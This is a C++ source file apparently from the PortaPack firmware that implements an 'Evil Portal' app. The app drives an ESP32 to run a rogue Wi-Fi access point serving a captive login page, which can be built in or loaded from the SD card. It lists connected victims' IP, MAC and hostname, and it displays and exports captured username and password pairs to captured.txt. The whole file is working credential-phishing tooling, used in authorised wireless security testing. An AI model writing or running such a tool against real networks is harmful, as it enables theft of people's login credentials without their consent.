/*
 * Copyright (C) 2025 HTotoo
 *
 * This file is part of PortaPack.
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2, or (at your option)
 * any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; see the file COPYING.  If not, write to
 * the Free Software Foundation, Inc., 51 Franklin Street,
 * Boston, MA 02110-1301, USA.
 */

#include "evilportal.hpp"
#include "ff.h"
#include <memory>
#include <string>
#include <vector>

extern "C" void initialize(const standalone_application_api_t& api) {
    _api = &api;
    context = new ui::Context();
    standaloneViewMirror = new ui::StandaloneViewMirror(*context, {0, 16, UI_POS_MAXWIDTH, UI_POS_MAXHEIGHT - 16});
    standaloneViewMirror->push<ui::EvilPortalView>();
}

namespace ui {

// FatFs on the PortaPack uses 16-bit TCHAR paths (LFN Unicode); widen/narrow ASCII.
static void to_tchar(const char* s, TCHAR* out, size_t maxlen) {
    size_t i = 0;
    for (; s[i] != 0 && i + 1 < maxlen; i++) out[i] = (TCHAR)(unsigned char)s[i];
    out[i] = 0;
}
static void tchar_to_char(const TCHAR* s, char* out, size_t maxlen) {
    size_t i = 0;
    for (; s[i] != 0 && i + 1 < maxlen; i++) out[i] = (char)(s[i] & 0xFF);
    out[i] = 0;
}

// Write lines to /WIFI/EvilPortal/<filename> on the SD card via the app file API.
bool ep_save_to_sd(const char* filename, const std::vector<std::string>& lines) {
    TCHAR dir[24];
    to_tchar("WIFI", dir, 24);  // f_mkdir makes one level at a time
    _api->f_mkdir(dir);
    to_tchar("WIFI/EvilPortal", dir, 24);
    _api->f_mkdir(dir);  // ignore result; may already exist

    char pathc[64];
    snprintf(pathc, sizeof(pathc), "WIFI/EvilPortal/%s", filename);
    TCHAR path[64];
    to_tchar(pathc, path, 64);

    FIL fil;
    if (_api->f_open(&fil, path, FA_WRITE | FA_CREATE_ALWAYS) != FR_OK) return false;
    for (const auto& l : lines) {
        std::string out = l + "\r\n";
        UINT bw = 0;
        _api->f_write(&fil, out.data(), out.size(), &bw);  // content is bytes, not TCHAR
    }
    _api->f_close(&fil);
    return true;
}

// ============================ Clients list ============================
EvilPortalDetailView::EvilPortalDetailView(NavigationView& nav, std::string title, std::string full)
    : nav_(nav), title_(title) {
    add_children({&menu});
    menu.on_left = [this]() { nav_.pop(); };
    menu.add_item({"[ < Back ]", ui::Color::white(), nullptr, [this](KeyEvent) { nav_.pop(); }});
    const size_t width = 28;  // chars per line on the small screen
    if (full.empty()) full = "(empty)";
    // split on '\n' (field breaks), then wrap each line to the screen width
    size_t start = 0;
    while (start <= full.size()) {
        size_t nl = full.find('\n', start);
        std::string ln = full.substr(start, nl == std::string::npos ? std::string::npos : nl - start);
        do {
            menu.add_item({ln.substr(0, width), ui::Color::white(), nullptr, [](KeyEvent) {}});
            ln = ln.size() > width ? ln.substr(width) : std::string();
        } while (!ln.empty());
        if (nl == std::string::npos) break;
        start = nl + 1;
    }
}

EvilPortalClientsView::EvilPortalClientsView(NavigationView& nav, uint16_t count)
    : nav_(nav), count_(count) {
    add_children({&text_info, &menu});
    menu.on_left = [this]() { nav_.pop(); };  // left = back to main
}

void EvilPortalClientsView::on_framesync() {
    if (!loaded_) {
        loaded_ = true;
        load();
    }
}

void EvilPortalClientsView::load() {
    lines_.clear();
    menu.clear();
    menu.add_item({"[ < Back ]", ui::Color::white(), nullptr, [this](KeyEvent) { nav_.pop(); }});
    menu.add_item({"[ Save to SD ]", ui::Theme::getInstance()->fg_yellow->foreground, nullptr, [this](KeyEvent) {
                       bool ok = ep_save_to_sd("clients.txt", lines_);
                       text_info.set(ok ? "Saved clients.txt" : "SD save failed");
                       set_dirty();
                   }});
    for (uint16_t i = 0; i < count_; i++) {
        uint16_t tx[2] = {(uint16_t)Command::PPCMD_EVILPORTAL_GET_CLIENT, i};
        ep_client_t c;
        memset(&c, 0, sizeof(c));
        if (_api->i2c_read((uint8_t*)tx, 4, (uint8_t*)&c, sizeof(c)) == false) continue;
        char ipbuf[20];
        snprintf(ipbuf, sizeof(ipbuf), "%u.%u.%u.%u", c.ip[0], c.ip[1], c.ip[2], c.ip[3]);
        char macbuf[20];
        snprintf(macbuf, sizeof(macbuf), "%02X:%02X:%02X:%02X:%02X:%02X",
                 c.mac[0], c.mac[1], c.mac[2], c.mac[3], c.mac[4], c.mac[5]);
        c.hostname[sizeof(c.hostname) - 1] = 0;
        std::string disp = std::string(ipbuf) + " " + macbuf;
        std::string full = "IP: " + std::string(ipbuf) + "\nMAC: " + macbuf + "\nHost: " + c.hostname;
        lines_.push_back(std::string(ipbuf) + "\t" + macbuf + "\t" + c.hostname);
        menu.add_item({disp, ui::Color::white(), nullptr,
                       [this, full](KeyEvent) { nav_.push<EvilPortalDetailView>(std::string("Client"), full); }});
    }
    text_info.set("Clients: " + to_string_dec_uint(count_));
    set_dirty();
}

// ============================ Captures list ============================
EvilPortalCapturesView::EvilPortalCapturesView(NavigationView& nav, uint16_t count)
    : nav_(nav), count_(count) {
    add_children({&text_info, &menu});
    menu.on_left = [this]() { nav_.pop(); };  // left = back to main
}

void EvilPortalCapturesView::on_framesync() {
    if (!loaded_) {
        loaded_ = true;
        load();
    }
}

void EvilPortalCapturesView::load() {
    lines_.clear();
    menu.clear();
    menu.add_item({"[ < Back ]", ui::Color::white(), nullptr, [this](KeyEvent) { nav_.pop(); }});
    menu.add_item({"[ Save to SD ]", ui::Theme::getInstance()->fg_yellow->foreground, nullptr, [this](KeyEvent) {
                       bool ok = ep_save_to_sd("captured.txt", lines_);
                       text_info.set(ok ? "Saved captured.txt" : "SD save failed");
                       set_dirty();
                   }});
    for (uint16_t i = 0; i < count_; i++) {
        uint16_t tx[2] = {(uint16_t)Command::PPCMD_EVILPORTAL_GET_CAPTURE, i};
        char buf[EP_CAP_LEN];
        memset(buf, 0, sizeof(buf));
        if (_api->i2c_read((uint8_t*)tx, 4, (uint8_t*)buf, EP_CAP_LEN) == false) continue;
        buf[EP_CAP_LEN - 1] = 0;
        std::string line(buf);
        lines_.push_back(line);  // full "user | pass" kept for the SD export

        std::string user = line, pass;
        size_t sep = line.find(" | ");
        if (sep != std::string::npos) {
            user = line.substr(0, sep);
            pass = line.substr(sep + 3);
        }
        // one row per capture; select to open the full user + pass
        std::string full = "User: " + user + "\nPass: " + pass;
        menu.add_item({std::to_string(i + 1) + " " + user, ui::Color::white(), nullptr,
                       [this, full](KeyEvent) { nav_.push<EvilPortalDetailView>(std::string("Captured"), full); }});
    }
    text_info.set("Captured: " + to_string_dec_uint(count_));
    set_dirty();
}

// ============================ Main view ============================
EvilPortalView::EvilPortalView(NavigationView& nav)
    : nav_(nav) {
    add_children({&labels,
                  &text_ap_ssid,
                  &button_edit_ssid,
                  &options_security,
                  &text_pwd,
                  &button_edit_pwd,
                  &button_reapply,
                  &button_startstop,
                  &options_template,
                  &text_clients,
                  &button_clients,
                  &text_captures,
                  &button_captures,
                  &text_status});

    options_security.set_by_value(0);

    button_edit_ssid.on_select = [this](Button&) {
        text_prompt(nav_, ap_ssid_, 29, ENTER_KEYBOARD_MODE_ALPHA, [this](std::string& value) {
            ap_ssid_ = value;
            text_ap_ssid.set("SSID: " + ap_ssid_);
            text_ap_ssid.set_dirty();
        });
    };
    button_edit_pwd.on_select = [this](Button&) {
        text_prompt(nav_, ap_pass_, 29, ENTER_KEYBOARD_MODE_ALPHA, [this](std::string& value) {
            ap_pass_ = value;
            update_security_ui();
        });
    };
    options_security.on_change = [this](size_t, OptionsField::value_t) {
        update_security_ui();
    };
    // Re-apply (only while running): push a changed SSID/security live.
    button_reapply.on_select = [this](Button&) { send_ap(); };
    button_reapply.hidden(true);

    // Start applies the current SSID/security first, then starts the portal.
    button_startstop.on_select = [this](Button&) {
        if (current_app == 0) {
            if (!send_ap()) return;  // abort start if WPA2 password invalid
        }
        send_start_stop();
    };
    options_template.on_change = [this](size_t, OptionsField::value_t v) {
        bool running = (current_app == EVILPORTAL_APP_ID);
        if (v >= 100) {  // custom page from SD
            size_t idx = (size_t)(v - 100);
            if (idx >= sd_html_.size()) return;
            if (running) {
                upload_sd_html(sd_html_[idx]);
            } else {
                // portal not up yet: remember and upload right after Start
                pending_html_idx_ = (int)idx;
                text_status.set("Will load on Start");
                _api->set_dirty();
            }
        } else {  // built-in template
            pending_html_idx_ = -1;  // cancel any pending custom upload
            if (running) send_template(static_cast<uint16_t>(v));
        }
    };
    button_clients.on_select = [this](Button&) { nav_.push<EvilPortalClientsView>(client_count_); };
    button_captures.on_select = [this](Button&) { nav_.push<EvilPortalCapturesView>(capture_count_); };

    update_security_ui();
}

void EvilPortalView::update_security_ui() {
    bool wpa2 = (options_security.selected_index_value() == 1);
    button_edit_pwd.hidden(!wpa2);
    text_pwd.hidden(!wpa2);  // only show the password row for WPA2
    if (wpa2)
        text_pwd.set("PWD: " + (ap_pass_.empty() ? std::string("(not set)") : ap_pass_));
    set_dirty();
}

bool EvilPortalView::send_ap() {
    bool wpa2 = (options_security.selected_index_value() == 1);
    if (wpa2 && ap_pass_.length() < 8) {
        text_status.set("WPA2 needs >= 8 char pass");
        _api->set_dirty();
        return false;
    }
    wifi_config_comp_t config;
    memset(&config, 0, sizeof(config));
    strncpy(config.ssid, ap_ssid_.c_str(), sizeof(config.ssid) - 1);
    if (wpa2) strncpy(config.password, ap_pass_.c_str(), sizeof(config.password) - 1);

    Command cmd = Command::PPCMD_EVILPORTAL_SET_AP;
    std::vector<uint8_t> data(sizeof(wifi_config_comp_t));
    memcpy(data.data(), &config, sizeof(wifi_config_comp_t));
    data.insert(data.begin(), reinterpret_cast<uint8_t*>(&cmd), reinterpret_cast<uint8_t*>(&cmd) + sizeof(cmd));
    if (_api->i2c_read(data.data(), data.size(), nullptr, 0) == false) return false;
    text_status.set("Portal AP: " + ap_ssid_ + (wpa2 ? " (WPA2)" : " (open)"));
    _api->set_dirty();
    return true;
}

void EvilPortalView::send_start_stop() {
    uint16_t appcmd = (current_app == 0) ? EVILPORTAL_APP_ID : 0;
    std::vector<uint16_t> data;
    data.push_back(static_cast<uint16_t>(Command::PPCMD_APPMGR_APPMGR));
    data.push_back(appcmd);
    if (_api->i2c_read((uint8_t*)data.data(), 4, nullptr, 0) == false) return;
    current_app = appcmd;
    update_running_ui();
}

void EvilPortalView::send_template(uint16_t tpl) {
    std::vector<uint16_t> data;
    data.push_back(static_cast<uint16_t>(Command::PPCMD_APPMGR_APPCMD));
    data.push_back(tpl);
    _api->i2c_read((uint8_t*)data.data(), 4, nullptr, 0);
}

void EvilPortalView::on_framesync() {
    if (config_loaded <= 20) config_loaded++;
    if (config_loaded == 20) {
        get_ap_config();
        scan_sd_html();
        Command cmd = Command::PPCMD_APPMGR_APPMGR;
        uint16_t capp = 0;
        if (_api->i2c_read((uint8_t*)&cmd, 2, (uint8_t*)&capp, 2)) {
            current_app = capp;
            update_running_ui();
        }
    }
    if (config_loaded < 20) return;

    if (current_app == EVILPORTAL_APP_ID) {
        // A custom SD page was picked before Start: give the on-system app a
        // moment to come up, then upload it once.
        if (pending_html_idx_ >= 0) {
            if (++pending_delay_ >= 30) {
                int idx = pending_html_idx_;
                pending_html_idx_ = -1;
                pending_delay_ = 0;
                if (idx < (int)sd_html_.size()) upload_sd_html(sd_html_[idx]);
            }
        }
        if (++poll_counter >= 30) {
            poll_counter = 0;
            get_status();
        }
    }
}

void EvilPortalView::get_ap_config() {
    Command cmd = Command::PPCMD_EVILPORTAL_GET_AP;
    wifi_config_comp_t current{};
    if (_api->i2c_read((uint8_t*)&cmd, 2, (uint8_t*)&current, sizeof(wifi_config_comp_t)) == false) return;
    current.ssid[sizeof(current.ssid) - 1] = 0;
    current.password[sizeof(current.password) - 1] = 0;
    if (current.ssid[0] != 0) {
        ap_ssid_ = std::string(current.ssid);
        text_ap_ssid.set("SSID: " + ap_ssid_);
        text_ap_ssid.set_dirty();
    }
    ap_pass_ = std::string(current.password);
    options_security.set_by_value(ap_pass_.empty() ? 0 : 1);
    update_security_ui();
}

void EvilPortalView::get_status() {
    Command cmd = Command::PPCMD_APPMGR_APPCMD;
    uint16_t buf[3] = {0, 0, 0};
    if (_api->i2c_read((uint8_t*)&cmd, 2, (uint8_t*)buf, 6) == false) return;
    // NOTE: intentionally do NOT sync options_template from buf[0] here. The
    // selector is user-driven; overwriting it every poll snapped a chosen SD
    // page back to the built-in "Captive Test" and re-sent template 0 to the
    // ESP (reverting the served page).
    capture_count_ = buf[1];
    client_count_ = buf[2];
    text_captures.set("Captured: " + to_string_dec_uint(buf[1]));
    text_clients.set("Clients: " + to_string_dec_uint(buf[2]));
    _api->set_dirty();
}

// Enumerate EvilPortal/html/*.html on the SD card and add them to the template
// selector (values >= 100), so custom pages can be picked and uploaded.
void EvilPortalView::scan_sd_html() {
    sd_html_.clear();
    TCHAR dirp[32];
    to_tchar("WIFI/EvilPortal/html", dirp, 32);
    DIR dir;
    if (_api->f_opendir(&dir, dirp) == FR_OK) {
        FILINFO fno;
        while (_api->f_readdir(&dir, &fno) == FR_OK && fno.fname[0] != 0) {
            if (fno.fattrib & AM_DIR) continue;
            char name[64];
            tchar_to_char(fno.fname, name, sizeof(name));
            std::string s(name);
            if ((s.size() > 5 && s.compare(s.size() - 5, 5, ".html") == 0) ||
                (s.size() > 4 && s.compare(s.size() - 4, 4, ".htm") == 0)) {
                sd_html_.push_back(s);
            }
        }
        _api->f_closedir(&dir);
    }

    OptionsField::options_t opts = {{"Captive Test", 0}};  // built-in "Captive Portal Test"
    for (size_t i = 0; i < sd_html_.size(); i++) {
        std::string label = sd_html_[i];
        if (label.size() > 14) label = label.substr(0, 14);
        opts.push_back({label, (OptionsField::value_t)(100 + i)});
    }
    options_template.set_options(opts);
}

// Stream a custom portal page to the ESP over I2C.
// NOTE: the ESP32 I2C slave RX FIFO is only 32 bytes and its ISR is starved
// while WiFi is active (portal running). A transaction larger than the FIFO
// overflows and the driver DROPS the excess bytes -> corrupt/blank page. So we
// keep each write well under 32 bytes: cmd(2)+offset(2)+chunk(24) = 28 bytes.
#define EP_HTML_CHUNK 24
void EvilPortalView::upload_sd_html(const std::string& name) {
    char pathc[96];
    snprintf(pathc, sizeof(pathc), "WIFI/EvilPortal/html/%s", name.c_str());
    TCHAR path[96];
    to_tchar(pathc, path, 96);

    FIL fil;
    if (_api->f_open(&fil, path, FA_READ) != FR_OK) {
        text_status.set("HTML open fail");
        _api->set_dirty();
        return;
    }
    uint16_t offset = 0;
    uint8_t chunk[EP_HTML_CHUNK];
    while (true) {
        UINT br = 0;
        if (_api->f_read(&fil, chunk, sizeof(chunk), &br) != FR_OK) break;
        if (br == 0) break;
        std::vector<uint8_t> tx;
        uint16_t cmd = (uint16_t)Command::PPCMD_EVILPORTAL_SET_HTML;
        tx.insert(tx.end(), (uint8_t*)&cmd, (uint8_t*)&cmd + 2);
        tx.insert(tx.end(), (uint8_t*)&offset, (uint8_t*)&offset + 2);
        tx.insert(tx.end(), chunk, chunk + br);
        _api->i2c_read(tx.data(), tx.size(), nullptr, 0);
        offset += br;
        if (offset >= 8000) break;  // ESP buffer cap safety
        if (br < sizeof(chunk)) break;  // EOF
    }
    _api->f_close(&fil);

    uint16_t cmd = (uint16_t)Command::PPCMD_EVILPORTAL_SET_HTML;
    uint16_t commit = 0xFFFF;
    uint8_t tx[4];
    memcpy(tx, &cmd, 2);
    memcpy(tx + 2, &commit, 2);
    _api->i2c_read(tx, 4, nullptr, 0);

    // read back how many bytes the ESP actually stored, so an oversized page
    // (truncated at the ~8 KB buffer -> renders blank) is visible immediately.
    uint16_t rcmd = (uint16_t)Command::PPCMD_EVILPORTAL_GET_HTMLLEN;
    uint8_t rb[4] = {0, 0, 0, 0};
    uint16_t esp_len = 0;
    if (_api->i2c_read((uint8_t*)&rcmd, 2, rb, 4)) {
        esp_len = (uint16_t)rb[0] | ((uint16_t)rb[1] << 8);
    }
    if (esp_len == 0)
        text_status.set("HTML not loaded");
    else if (esp_len >= 8000 || offset >= 8000)
        text_status.set("Too big >8KB - truncated!");
    else
        text_status.set("Loaded " + name + " (" + std::to_string(esp_len) + "B)");
    _api->set_dirty();
}

void EvilPortalView::update_running_ui() {
    bool running = (current_app == EVILPORTAL_APP_ID);
    button_startstop.set_text(running ? "Stop" : "Start");
    button_reapply.hidden(!running);  // only meaningful while the portal runs
    text_status.set(running ? "Running - portal live" : "Stopped");
    if (running)
        get_status();
    else {
        pending_html_idx_ = -1;  // drop any queued upload when stopped
        pending_delay_ = 0;
        text_captures.set("Captured: 0");
        text_clients.set("Clients: 0");
    }
    _api->set_dirty();
}

}  // namespace ui
